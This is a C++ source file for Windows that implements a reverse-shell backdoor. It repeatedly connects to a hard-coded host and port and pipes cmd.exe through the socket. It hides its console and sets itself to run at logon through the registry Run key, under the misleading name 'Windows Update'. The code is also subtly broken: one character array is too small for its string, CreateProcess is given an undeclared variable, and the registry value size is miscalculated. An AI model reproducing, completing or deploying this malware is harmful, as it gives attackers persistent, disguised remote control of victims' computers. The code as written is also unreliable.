#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;


void RunShell(char* ip, int port) 
{
    while (true)
   	{
        SOCKET socket;
        sockaddr_in addr;
        WSADATA version;
        auto ret = WSAStartup(MAKEWORD(2, 2), &version);
        socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(ip);
        addr.sin_port = htons(port);

        if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) 
        {
            closesocket(socket);
            WSACleanup();
            continue;
        }
        else 
        {
            char data[1024];
            memset(data, 0, sizeof(data));
            int code = recv(socket, data, 1024, 0);
            if (code <= 0) 
            {
                closesocket(socket);
                WSACleanup();
                continue;
            }
            else 
            {
                char ProcessName[7] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(data, 0, sizeof(data));
                int code = recv(socket, data, 1024, 0);
                if (code <= 0) 
                {
                    closesocket(socket);
                    WSACleanup();
                    continue;
                }       
            }
        }
    }
}

int main(int argc, char** argv) 
{
    FreeConsole();

    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);     
    LONG status = RegSetValueEx(hkey, "Windows Update", 0, REG_SZ, (BYTE*)argv[0], (string(argv[0]).size() + 1) * sizeof(wchar_t));

    char host[] = "localhost";
    int port = 0xDEAD;
    RunShell(host, port);

    return 0;
}
